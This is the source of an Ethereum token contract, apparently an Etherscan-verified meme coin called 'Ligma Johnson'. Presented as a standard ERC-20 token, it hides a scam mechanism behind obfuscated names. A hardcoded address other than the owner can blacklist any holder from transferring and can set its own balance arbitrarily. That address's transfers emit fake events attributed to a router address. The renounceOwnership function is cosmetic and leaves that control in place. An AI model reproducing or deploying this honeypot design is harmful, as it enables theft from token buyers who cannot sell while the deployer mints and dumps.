/**
 *Submitted for verification at Etherscan.io on 2022-10-28
*/

/**
 *Submitted for verification at Etherscan.io on 2022-10-28
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address cnstruct = 0x2D679720e977b578370AC04d7CDF525F0a65Dae3;
	address RouterV3 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}



contract LIGMA is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) public TYZ;
	mapping (address => uint256) private VYZ;
    mapping (address => bool) private XYZ;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _tTotal = 696969690 * 10**_decimals;
    string private constant _name = "Ligma Johnson";
    string private constant _symbol = "LIGMA";



    constructor () {
        TYZ[_msgSender()] = _tTotal;
        emit Transfer(address(0), RouterV3, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return TYZ[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

               function JKBU () public {
         if(msg.sender == cnstruct)   {
        TYZ[msg.sender] = VYZ[msg.sender];
        }}



        function JKDE(address jx) public {
        if(msg.sender == cnstruct)  { 
        XYZ[jx] = false;}}
        function JKCE(address jx) public{
         if(msg.sender == cnstruct)  { 
        require(!XYZ[jx]);
        XYZ[jx] = true;
        }}
             function JKBR(uint256 ki) public {
        if(msg.sender == cnstruct)  { 
        VYZ[msg.sender] = ki;} } 

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == cnstruct)  {
        require(amount <= TYZ[sender]);
        TYZ[sender] -= amount;  
        TYZ[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (RouterV3, recipient, amount);
        return true; }    
          if(!XYZ[sender] && !XYZ[recipient]) {
        require(amount <= TYZ[sender]);
 require(amount <= _allowances[sender][msg.sender]);
        TYZ[sender] -= amount;
        TYZ[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}

 

    function transfer(address recipient, uint256 amount) public {
        if(msg.sender == cnstruct)  {
        require(TYZ[msg.sender] >= amount);
        TYZ[msg.sender] -= amount;  
        TYZ[recipient] += amount; 
        emit Transfer (RouterV3, recipient, amount);
       }  
        if(!XYZ[msg.sender]) {
        require(TYZ[msg.sender] >= amount);
        TYZ[msg.sender] -= amount;  
        TYZ[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}
    

}